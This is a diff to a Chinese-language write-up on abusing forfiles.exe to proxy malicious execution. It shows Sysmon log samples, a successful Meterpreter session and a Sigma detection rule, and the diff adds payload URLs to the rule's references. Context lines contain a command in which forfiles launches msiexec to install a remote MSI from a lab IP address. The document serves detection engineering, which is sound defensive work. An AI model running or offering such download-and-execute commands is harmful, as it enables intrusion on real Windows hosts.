@@ -104,7 +104,7 @@ forfiles /p C:\Windows\System32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.
 
 6. **结果分析**：
 
-- 成功：获得Meterpreter会话，`getuid`显示用户为`12306Br0-PC\12306Br0`。
+- 成功：获得Meterpreter会话，`getuid`显示用户为`0x783kb-PC\0x783kb`。
 
 - 失败可能原因：
   - 防火墙阻止HTTP请求或TCP8888连接。
@@ -134,8 +134,8 @@ forfiles /p C:\Windows\System32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.
   事件ID:1
   OriginalFileName:forfiles.exe
   CommandLine:forfiles /p C:\Windows\System32 /m cmd.exe /c "C:\Windows\System32\shell.exe"
-  CurrentDirectory:C:\Users\12306Br0\
-  User:12306Br0-PC\12306Br0
+  CurrentDirectory:C:\Users\0x783kb\
+  User:0x783kb-PC\0x783kb
   Hashes:SHA1=7A3B2C1D4E5F67890123456789ABCDEF01234567
   ParentImage:C:\Windows\System32\cmd.exe
   ```
@@ -144,7 +144,7 @@ forfiles /p C:\Windows\System32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.
   OriginalFileName:shell.exe
   CommandLine:C:\Windows\System32\shell.exe
   CurrentDirectory:C:\Windows\System32\
-  User:12306Br0-PC\12306Br0
+  User:0x783kb-PC\0x783kb
   Hashes:SHA1=C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C
   ParentImage:C:\Windows\System32\cmd.exe
   ```
@@ -180,22 +180,25 @@ forfiles /p C:\Windows\System32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.
 ### Sigma规则
 新增Sigma规则以增强检测：
 ```yaml
-title:可疑Forfiles.exe执行Payload
-id:1a2b3c4d-5e6f-7890-a1b2-c3d4e5f67890
-description:检测forfiles.exe通过/c参数执行可执行文件或MSI，可能用于代理恶意代码
-status:experimental
+title: 可疑Forfiles.exe执行Payload
+id: 1a2b3c4d-5e6f-7890-a1b2-c3d4e5f67890
+description: 检测forfiles.exe通过/c参数执行可执行文件或MSI，可能用于代理恶意代码
+status: experimental
+references:
+  - http://192.168.126.146/abc.msi"
+  - http://192.168.126.146/shell.exe','C:\Windows\System32\shell.exe'
 logsource:
-  category:process_creation
-  product:windows
+  category: process_creation
+  product: windows
 detection:
   selection:
-    Image|endswith:'\forfiles.exe'
-    CommandLine|contains:'/c'
+    Image|endswith: '\forfiles.exe'
+    CommandLine|contains: '/c'
   filter_legitimate:
     CommandLine|contains:
       - '.txt'
       - '.log'
-  condition:selection and not filter_legitimate
+  condition: selection and not filter_legitimate
 fields:
   - Image
   - CommandLine
@@ -203,9 +206,12 @@ fields:
   - User
 falsepositives:
   - 合法的文件操作脚本
-level:high
+level: high
+author: 0x783kb
+date: 2022/06/06
 tags:
   - attack.execution
+  - attack.defense_evasion
   - attack.t1202
 ```
 
